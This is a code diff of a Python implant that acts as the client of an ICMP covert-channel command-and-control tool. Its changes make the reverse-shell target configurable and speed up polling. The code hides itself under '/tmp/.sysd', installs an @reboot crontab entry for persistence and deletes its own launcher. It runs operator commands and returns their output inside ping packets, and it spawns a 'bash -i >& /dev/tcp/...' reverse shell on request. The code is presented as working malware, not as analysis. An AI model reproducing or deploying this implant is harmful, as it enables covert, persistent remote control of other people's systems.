@@ -1,3 +1,5 @@
+#!/usr/bin/env python3
+
 import socket
 import struct
 import time
@@ -7,7 +9,7 @@ import subprocess
 import sys
 
 SERVER_IP = "192.168.108.137" # IP addr of whatever the server script is running on, this one is from local testing
-INTERVAL = 5
+INTERVAL = 1
 CLIENT_ID = random.randint(1000, 9999)
 PERSISTENT_PATH = "/tmp/.sysd"  # More masked name
 
@@ -58,10 +60,13 @@ def receive_reply(sock):
         return None
     return None
 
-def reverse_shell():
-    """Spawns a reverse shell as a separate process."""
+def reverse_shell(ip=None, port=4444):
+    """Spawns a reverse shell as a separate process with configurable IP and port."""
+    if ip is None:
+        ip = SERVER_IP
+    
     subprocess.Popen(
-        ["/bin/bash", "-c", f"bash -i >& /dev/tcp/{SERVER_IP}/4444 0>&1"],
+        ["/bin/bash", "-c", f"bash -i >& /dev/tcp/{ip}/{port} 0>&1"],
         stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL, stdin=subprocess.DEVNULL
     )
 
@@ -78,7 +83,7 @@ def execute_command(command):
 
 def send_command_output(sock, seq, output):
     """Send command output in chunks."""
-    chunk_size = 128
+    chunk_size = 256  # Increased chunk size for faster transmission
     if not output:
         output = "[No output]"
     chunks = [output[i:i+chunk_size] for i in range(0, len(output), chunk_size)]
@@ -86,7 +91,7 @@ def send_command_output(sock, seq, output):
     for i, chunk in enumerate(chunks):
         chunk_msg = f"[{i+1}/{len(chunks)}] {chunk}"
         send_ping(sock, seq + i, chunk_msg)
-        time.sleep(0.5)
+        time.sleep(0.1)  # Reduced from 0.5 to 0.1 for faster response
 
 def setup_persistence():
     """Ensure persistence via crontab. Creates a backup file at the persistent path"""
@@ -99,8 +104,8 @@ def setup_persistence():
 
     # delete starting file
     time.sleep(1)
-    if os.path.basename(sys.argv[0]) == "client.py":
-        os.unlink(sys.argv[0])  # Only delete if named client.py. This way the persistent file remains
+    if os.path.basename(sys.argv[0]) == "network]":
+        os.unlink(sys.argv[0])  # Only delete if name matches above. This way the persistent file remains
 
     # cron tab for rebooting
     cron_job = f"@reboot {PERSISTENT_PATH} &"
@@ -137,22 +142,46 @@ def main():
     daemonize()
 
     sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_ICMP)
-    sock.settimeout(3)
+    sock.settimeout(1)
     seq = 1
 
     while True:
         send_ping(sock, seq, f"ALIVE:{CLIENT_ID}")  # Heartbeat
-        response = receive_reply(sock)
-
-        if response:
-            if response.lower() == "exit":
-                break
-            elif response.lower() == "shell":
-                reverse_shell()
-                send_ping(sock, seq + 1, "Shell spawned")
-            elif response.startswith("CMD:"):
-                output = execute_command(response)
-                send_command_output(sock, seq + 1, output)
+        
+        for _ in range(3):  # Check multiple times per interval
+            response = receive_reply(sock)
+            if response:
+                if response.lower() == "exit":
+                    break
+                elif response.lower() == "shell":
+                    # use default settings, ip addr hard coded and port 4444
+                    reverse_shell()
+                    send_ping(sock, seq + 1, "Shell spawned (Default: IP=" + SERVER_IP + ", Port=4444)")
+                elif response.lower().startswith("shell "):
+                    # Look if IP and port are provided
+                    parts = response.split()
+                    try:
+                        # Check if we have both IP and port or just port
+                        if len(parts) == 3:
+                            # Format: "shell [IP] [PORT]"
+                            ip = parts[1]
+                            port = int(parts[2])
+                            reverse_shell(ip, port)
+                            send_ping(sock, seq + 1, f"Shell spawned (IP={ip}, Port={port})")
+                        elif len(parts) == 2:
+                            # Format: "shell [PORT]"
+                            port = int(parts[1])
+                            reverse_shell(None, port)
+                            send_ping(sock, seq + 1, f"Shell spawned (IP={SERVER_IP}, Port={port})")
+                        else:
+                            # Invalid format
+                            send_ping(sock, seq + 1, "Invalid shell command format. Use: shell [IP] [PORT] or shell [PORT]")
+                    except ValueError:
+                        send_ping(sock, seq + 1, "Invalid port number")
+                elif response.startswith("CMD:"):
+                    output = execute_command(response)
+                    send_command_output(sock, seq + 1, output)
+            time.sleep(0.3)  # Short sleep between checks
 
         seq += 1
         time.sleep(INTERVAL)
